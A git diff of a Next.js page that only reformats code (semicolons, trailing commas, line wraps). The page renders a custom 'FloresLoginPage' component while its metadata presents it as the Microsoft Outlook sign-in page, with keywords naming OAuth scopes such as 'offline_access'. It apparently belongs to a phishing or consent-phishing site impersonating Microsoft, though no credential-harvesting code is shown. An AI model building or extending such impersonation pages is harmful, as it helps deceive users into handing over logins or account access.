@@ -1,9 +1,10 @@
-import { FloresLoginPage } from "@/components/flores-login-page"
-import type { Metadata } from "next"
+import { FloresLoginPage } from "@/components/flores-login-page";
+import type { Metadata } from "next";
 
 export const metadata: Metadata = {
   title: "Microsoft Outlook | Sign in",
-  description: "Sign in to Microsoft Outlook Mail. Access your email, calendar, and contacts securely with Microsoft account authentication.",
+  description:
+    "Sign in to Microsoft Outlook Mail. Access your email, calendar, and contacts securely with Microsoft account authentication.",
   keywords: [
     "Microsoft Outlook login",
     "Outlook Mail sign in",
@@ -14,19 +15,20 @@ export const metadata: Metadata = {
     "OpenID login",
     "offline_access",
     "profile access",
-    "Microsoft auth"
+    "Microsoft auth",
   ],
   openGraph: {
     title: "Microsoft Outlook | Sign in",
-    description: "Sign in to Microsoft Outlook Mail. Access your email, calendar, and contacts securely with Microsoft account authentication.",
+    description:
+      "Sign in to Microsoft Outlook Mail. Access your email, calendar, and contacts securely with Microsoft account authentication.",
     type: "website",
     url: "/",
   },
   alternates: {
     canonical: "/",
   },
-}
+};
 
 export default function Page() {
-  return <FloresLoginPage />
+  return <FloresLoginPage />;
 }
